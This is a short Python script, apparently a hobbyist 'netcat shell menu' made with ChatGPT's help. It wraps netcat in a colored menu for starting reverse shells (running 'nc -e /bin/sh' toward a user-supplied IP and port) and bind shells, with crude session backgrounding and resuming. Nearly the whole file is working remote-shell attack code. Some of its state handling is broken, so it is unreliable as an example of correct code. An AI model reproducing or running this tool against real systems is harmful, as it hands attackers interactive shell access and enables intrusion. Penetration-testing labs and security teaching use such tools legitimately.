#!/usr/bin/python
#!/usr/bin/python
import subprocess, sys, select, threading, signal

###########
#Netcat shell menu in coop with chat gpt3
###########

# A list to store the running processes
processes = []
resume = True

# Colors
HEADER = '\033[95m'
# OKBLUE = '\033[94m'
OKCYAN = '\033[96m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
YELLOW = '\033[33m'
GREEN = '\033[32m'

def reverse_shell():
    # Start a reverse shell by connecting to the target IP and port
    resume = True
    
    target_ip = input(YELLOW + "\n[*] Enter target \n[!]IP: ")
    target_port = input(YELLOW + "[!]Port: ")

    p = subprocess.Popen(["nc", "-e", "/bin/sh", target_ip, target_port])
    processes.append(p)
    

def bind_shell():
    # Start a bind shell by listening on a specific port
    resume = True

    listen_port = input(YELLOW + "\n[*] Enter listening \n[!]Port: ")

    p = subprocess.Popen(["nc", "-l", "-v", "-p", listen_port])
    processes.append(p)

def background_session():
    # Background the current session

    shell_proc = processes[-1]
    shell_proc.send_signal(signal.SIGSTOP)

    print_menu()
    #p = subprocess.Popen(["bg", str(shell_proc.pid)])
    #processes.append(p)

def list_sessions():
    # List all running sessions
    for i, p in enumerate(processes):
        print(f"{GREEN}{i+1}. Session {i+1} (PID: {p.pid})")
    

def resume_session():
    # Resume background sessions
    list_sessions()
    session_number = int(input(YELLOW + "\nEnter the session number you want to resume: "))
    p = processes[session_number-1]
    p.send_signal(signal.SIGCONT)
    #subprocess.Popen(["fg", str(p.pid)])
    listen_background_session()
    resume = True


def listen_background_session():
    while resume:
        r, w, e = select.select([sys.stdin], [], [], 0.1)
        if r:
            c = sys.stdin.read(1)
            if c == 'b':
                if len(processes) == 0:
                    print(f"{WARNING}\n[!] You haven´t started any shells; Try one!")
                
                else:
                    background_session()

def print_menu():
    resume = False
    print(f"{GREEN}\n\n1. Reverse shell")
    print(f"{GREEN}2. Bind shell")
    #print("3. Background session")
    #print("3. List sessions")
    print(f"{OKCYAN}3. Resume session")
    choice = input(f"{YELLOW}\n[*]Enter your choice: ")

    if choice == "1":
        reverse_shell()
    elif choice == "2":
        bind_shell()
    #elif choice == "3":
    #    background_session()
    #elif choice == "3":
    #    list_sessions()
    elif choice == "3":
        resume_session()
    else:
        print(f"{FAIL}Invalid choice")
    
def print_banner():
    print(f"""{HEADER}
                                                       
    __                               _____             
 __|  |___ ___ ___ _ _    ___ ___   |     |___ ___ _ _ 
|  |  | .'| . | . | | |  |   |  _|  | | | | -_|   | | |
|_____|__,|_  |_  |_  |  |_|_|___|  |_|_|_|___|_|_|___|
          |___|___|___|                                
""")

def start_listener():
    t = threading.Thread(target=listen_background_session)
    t.start()

if __name__ == "__main__":
        print_banner()
        print_menu()
        listen_background_session()

    
    
